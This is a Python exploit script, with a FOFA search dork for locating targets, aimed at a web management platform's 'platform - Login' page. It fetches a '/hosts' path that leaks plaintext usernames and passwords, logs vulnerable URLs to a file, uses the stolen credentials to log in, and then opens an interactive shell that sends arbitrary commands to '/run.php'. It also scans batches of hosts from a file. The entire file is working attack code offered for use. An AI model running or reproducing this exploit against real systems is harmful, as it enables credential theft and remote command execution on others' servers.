import requests
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings()
import argparse
import re

parser = argparse.ArgumentParser(description='')
parser.add_argument('-u','--url',default='')
parser.add_argument('-f','--file',default='')
arg = parser.parse_args() 
urllib3.disable_warnings() # 屏蔽证书警告

name = """
██╗  ██╗     ███████╗██╗  ██╗██████╗ 
╚██╗██╔╝     ██╔════╝╚██╗██╔╝██╔══██╗
 ╚███╔╝█████╗█████╗   ╚███╔╝ ██████╔╝
 ██╔██╗╚════╝██╔══╝   ██╔██╗ ██╔═══╝ 
██╔╝ ██╗     ███████╗██╔╝ ██╗██║     
╚═╝  ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝                                      

fofa:" title=="platform - Login" "
"""
print(name)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept-Encoding': 'identity',
    'Accept-Language': 'zh-CN'
    }



def poc(url):
    try:
        target = urljoin(url,'/hosts')
        res = requests.get(url=target,headers=headers,verify=False,timeout=3)
        global r
        r =res.text
        if res.status_code == 200 and "Password" in res.text:
            print(f"[+] 目标系统: {url} 存在漏洞")
            print(f"[+] 账号密码为: \n{res.text}")
            with open(r'exp.txt','a+') as w:
                w.write(url+'\n')
        else:
            print("[-] 不存在漏洞")
            print("[" + "-" * 100 + "]")
    except Exception as err:
        print(err)

def exp(url):
    try:
        target = urljoin(url,'/login.php')
        run = urljoin(url,"/run.php")
        na = re.compile(r"UserName=(.*)")
        pw = re.compile(r"Password=(.*)")
        Username = na.findall(r)[0]
        Password = pw.findall(r)[0]
        data = f"""user={Username}&passwd={Password}"""
        S = requests.session()
        res = S.post(url=target,headers=headers,verify=False,timeout=3,data=data)
        if res.status_code == 200 and "管理系统" in res.text:
            print("[+] 登录成功,请输入命令")
            try:
                while True:
                    Command = input(">>>")
                    data2 = "command=%09++++++{}&textarea=++++++++++".format(Command)
                    res1 = S.post(url=run,headers=headers,verify=False,timeout=3,data=data2)
                    res2 = re.findall(r"<textarea.*?>(.+?)</textarea>",res1.text,re.S)
                    print("".join(res2))
                    if Command == "exit":
                        break
            except Exception as err:
                print(err)
        else:
            print("[-] 登陆失败")
    except Exception as err:
        print(err)

def other(file):
    f = open(file,'r')
    for i in f.readlines():
        i = i.strip()
        if i[:4] != "http":
                i = "http://" + i
        poc(i)       

if __name__ == "__main__":
    if arg.url != '' and arg.file == '' :
        poc(arg.url)
        exp(arg.url)
    if arg.url == '' and arg.file != '' :
        other(arg.file)